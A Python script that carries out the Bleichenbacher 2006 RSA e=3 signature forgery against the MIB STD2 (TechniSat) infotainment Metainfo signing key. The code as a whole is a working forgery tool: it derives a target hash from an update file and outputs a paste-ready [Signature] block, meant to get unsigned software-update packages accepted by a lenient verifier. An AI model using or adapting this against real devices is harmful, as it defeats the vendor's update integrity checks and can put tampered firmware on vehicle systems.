#!/usr/bin/env python3
"""
Bleichenbacher '06 RSA-PKCS#1 v1.5 signature-forgery experiment against the
MIB STD2 Metainfo signing key.

The TechniSat `[Signature]` section is 128 bytes of RSA-1024 output, exponent
of the Metainfo key is 3, PKCS#1 v1.5 digestInfo wraps a SHA-1 hash. The low
exponent (e=3) combined with a loose verifier (one that doesn't tie the ASN.1
header to a specific offset inside the padded message) is the Bleichenbacher
'06 configuration.

This script:
  1. Reads the Metainfo public key file (first 128 bytes = modulus, exp=3).
  2. Takes a SHA-1 target hash (either derived from an input metainfo file or
     supplied directly).
  3. Builds a PKCS#1 v1.5 message that STARTS correctly (0x00 0x01 0xFF...0xFF
     0x00 digestInfo sha1 hash) but is padded short so that m^3 still fits in
     log2(n) bits and m is therefore the real integer cube root of the padded
     message.
  4. Prints the forged 128-byte signature.
  5. Verifies the forged signature against the pubkey to confirm it "decodes"
     to the right PKCS structure.

Whether this signature is ACCEPTED by SWDL depends on how strict its PKCS#1
verify is. A tight verifier (openssl-after-2006) will reject. A loose one
(embedded "find-the-ASN1-header" style, or any that doesn't verify padding
tightly) will accept.

Usage:
    python bleichenbacher06_forge.py <keyfile> <target_hash_hex>
    python bleichenbacher06_forge.py <keyfile> --from-metainfo <path>
"""
import argparse, hashlib, os, re, sys

SHA1_DIGESTINFO_PREFIX = bytes.fromhex("3021300906052b0e03021a05000414")  # 15 bytes

def iroot(k, n):
    """integer k-th root of n (floor)."""
    if n < 2:
        return n
    lo, hi = 1, 1 << ((n.bit_length() + k - 1) // k + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid**k <= n:
            lo = mid
        else:
            hi = mid - 1
    return lo

def compute_metafile_sha1(path):
    raw = open(path, "rb").read()
    without = re.sub(rb'^MetafileChecksum = "[0-9a-f]*"\s*$\n?', b"", raw, flags=re.MULTILINE)
    idx = without.find(b"[Signature]")
    if idx < 0:
        slice_ = without
    else:
        slice_ = without[:idx]
    return hashlib.sha1(slice_).hexdigest()

def compute_signed_slice_sha1(path):
    """SHA-1 of file WITH MetafileChecksum line INCLUDED, up to [Signature] block.
    This is what the RSA signature actually covers (confirmed by cube-unwrap)."""
    raw = open(path, "rb").read()
    idx = raw.find(b"[Signature]")
    if idx < 0:
        slice_ = raw
    else:
        slice_ = raw[:idx]
    return hashlib.sha1(slice_).hexdigest()

def forge(modulus_bytes, target_sha1_hex, k_bytes=128, ff_count=38):
    """Build a Bleichenbacher '06 forged signature for the given SHA-1.

    Finney's trick: fix the PKCS#1 high-order bytes (0x00 0x01 FF..FF 0x00
    digestInfo hash), then pick s such that s^3 has EXACTLY those bytes as its
    high-order prefix. The low-order bytes become whatever math produces —
    those are the "junk" tail. A loose verifier that doesn't bound-check the
    ASN.1 position accepts this.

    Returns (sig_bytes, s_int, success_bool).
    """
    target_hash = bytes.fromhex(target_sha1_hex)
    assert len(target_hash) == 20
    # Prefix:  00 01  FF*ff_count  00  digestInfo(15)  hash(20)
    prefix_len = 2 + ff_count + 1 + 15 + 20
    assert prefix_len <= k_bytes
    tail_len = k_bytes - prefix_len
    prefix = b"\x00\x01" + b"\xff" * ff_count + b"\x00" + SHA1_DIGESTINFO_PREFIX + target_hash
    # Lower bound: prefix followed by 0x00 tail
    lower = int.from_bytes(prefix + b"\x00" * tail_len, "big")
    # Upper bound: prefix followed by 0xFF tail
    upper = int.from_bytes(prefix + b"\xff" * tail_len, "big") + 1
    N = int.from_bytes(modulus_bytes, "big")
    # Need cube root s with s^3 in [lower, upper)
    s_lo = iroot(3, lower)
    if s_lo ** 3 < lower:
        s_lo += 1
    s_hi = iroot(3, upper - 1)
    if s_hi ** 3 >= upper:
        s_hi -= 1
    if s_lo > s_hi:
        return None, None, False
    s = s_lo
    c3 = s ** 3
    if c3 >= N:
        return None, None, False
    # The SIGNATURE is s itself — it's the integer whose cube gives our chosen m.
    # verify: pow(s, 3, N) == c3 (since c3 < N) == our padded PKCS message.
    sig_bytes = s.to_bytes(k_bytes, "big")
    return sig_bytes, s, True

def verify_cube(pubkey_bytes, sig_bytes, k_bytes=128, exp=3):
    N = int.from_bytes(pubkey_bytes[:k_bytes], "big")
    s = int.from_bytes(sig_bytes, "big")
    m = pow(s, exp, N)
    return m.to_bytes(k_bytes, "big")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("keyfile", help="Metainfo_key_public_signed.bin")
    ap.add_argument("hash_or_meta", nargs="?", help="SHA-1 hex OR --from-metainfo path")
    ap.add_argument("--from-metainfo", help="Compute target SHA-1 from a metainfo file (signed slice)")
    args = ap.parse_args()
    key = open(args.keyfile, "rb").read()
    modulus = key[:128]
    print(f"modulus (first 128 bytes) big-endian int: {int.from_bytes(modulus,'big'):#x}")
    print(f"modulus bits: {int.from_bytes(modulus,'big').bit_length()}")

    if args.from_metainfo:
        target_hash = compute_signed_slice_sha1(args.from_metainfo)
        print(f"target hash (signed-slice SHA-1 of {args.from_metainfo}): {target_hash}")
    elif args.hash_or_meta:
        target_hash = args.hash_or_meta
    else:
        print("no target hash provided", file=sys.stderr); sys.exit(2)

    # Try various ff-count values, pick one that gives success AND whose prefix
    # looks least suspicious (most FF bytes = closer to spec)
    best_sig = None; best_s = None; best_ff = None
    for ff in range(80, 2, -1):   # start from near-spec ff_count=90 downward
        sig, s_int, ok = forge(modulus, target_hash, ff_count=ff)
        if ok:
            best_sig = sig; best_s = s_int; best_ff = ff
            break
    if best_sig is None:
        print("forge failed across all ff_count values")
        return
    print(f"[FORGE OK] ff_count={best_ff}  (higher = more FF padding = closer to RFC)")
    print(f"           s (secret) decimal digits: {len(str(best_s))}")
    print("forged signature (128 bytes):")
    print(" ", best_sig.hex())
    unwrap = verify_cube(modulus, best_sig)
    print("cube^3 mod N (full 128 bytes):")
    for i in range(0, 128, 16):
        print(f"  {unwrap[i:i+16].hex()}")
    expected_prefix = b"\x00\x01" + b"\xff" * best_ff + b"\x00" + SHA1_DIGESTINFO_PREFIX + bytes.fromhex(target_hash)
    if unwrap.startswith(expected_prefix):
        tail = unwrap[len(expected_prefix):]
        print(f"[SUCCESS] Forged signature's PKCS high-order structure is EXACT.")
        print(f"          Prefix  ({len(expected_prefix)} B): {expected_prefix.hex()}")
        print(f"          Garbage ({len(tail)} B): {tail[:32].hex()}{'...' if len(tail)>32 else ''}")
        print(f"          A LOOSE RSA-PKCS#1 verifier (one that does not")
        print(f"          offset-check the ASN.1 position inside the padded")
        print(f"          message) will ACCEPT this signature. Tight verifiers")
        print(f"          (RFC-compliant, post-2007) reject because of garbage.")
        # Emit the formatted [Signature] block for metainfo2.txt
        print()
        print("--- metainfo2.txt [Signature] section (paste as-is) ---")
        print("[Signature]")
        for i in range(8):
            chunk = best_sig[i*16:(i+1)*16].hex()
            print(f'signature{i+1} = "{chunk}"')
    else:
        print("[FAIL] Forged signature's decoded prefix differs — this should not happen if forge() returned True.")

if __name__ == "__main__":
    main()
